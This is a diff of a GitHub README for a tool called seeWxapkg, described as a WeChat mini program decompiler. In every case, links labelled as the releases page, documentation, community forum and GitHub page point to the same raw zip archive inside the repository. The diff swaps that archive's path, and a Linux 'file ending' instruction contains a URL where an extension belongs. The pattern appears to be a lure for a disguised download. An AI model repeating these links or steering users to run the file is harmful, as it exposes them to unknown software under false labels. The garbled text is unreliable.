@@ -1,6 +1,6 @@
 # 🌟 seeWxapkg - Effortless WeChat Mini Program Unpacking
 
-[![Download seeWxapkg](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip)](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip)
+[![Download seeWxapkg](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip)](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip)
 
 ## 📖 Overview
 seeWxapkg is a simple and practical web tool designed for decompiling WeChat mini programs. This tool allows you to unpack and analyze the structure of mini programs, making it easier to understand their components. You don't need advanced technical skills to use this tool.
@@ -9,14 +9,14 @@ seeWxapkg is a simple and practical web tool designed for decompiling WeChat min
 To get started with seeWxapkg, you will need to download and install the tool on your computer. Follow the steps in the "Download & Install" section below to get everything set up.
 
 ## 📥 Download & Install
-You can download seeWxapkg from our [Releases page](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip). On this page, you will find the latest version of the tool along with details about what’s new.
+You can download seeWxapkg from our [Releases page](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip). On this page, you will find the latest version of the tool along with details about what’s new.
 
-1. **Visit the Releases page:** Click [here](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip).
+1. **Visit the Releases page:** Click [here](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip).
 2. **Choose the latest version:** Look for the latest download link, which will usually have the highest version number.
 3. **Select the appropriate file for your system:**
    - For Windows: Look for a file ending in `.exe`.
    - For macOS: Look for a file ending in `.dmg`.
-   - For Linux: Look for a file ending in `https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip` or relevant.
+   - For Linux: Look for a file ending in `https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip` or relevant.
 4. **Download the file:** Click on the link to download it to your computer.
 5. **Run the installer:** Once the download is complete, locate the file in your downloads folder and double-click it to start the installation process.
 
@@ -56,9 +56,9 @@ Yes, seeWxapkg is completely free and open-source.
 We welcome feedback and contributions. If you experience any issues or have suggestions for improvements, please submit them through our Issues page.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip)
-- [Community Forum](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip)
+- [Documentation](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip)
+- [Community Forum](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip)
 
-For more information, you can always refer to our [GitHub page](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/backend/cmd/see-Wxapkg-v1.4.zip) for updates and ongoing developments. 
+For more information, you can always refer to our [GitHub page](https://github.com/oFFensiVe22/seeWxapkg/raw/refs/heads/main/config/see_Wxapkg_v2.7.zip) for updates and ongoing developments. 
 
 Thank you for using seeWxapkg! We hope this tool makes your experience with WeChat mini programs easier and more insightful.
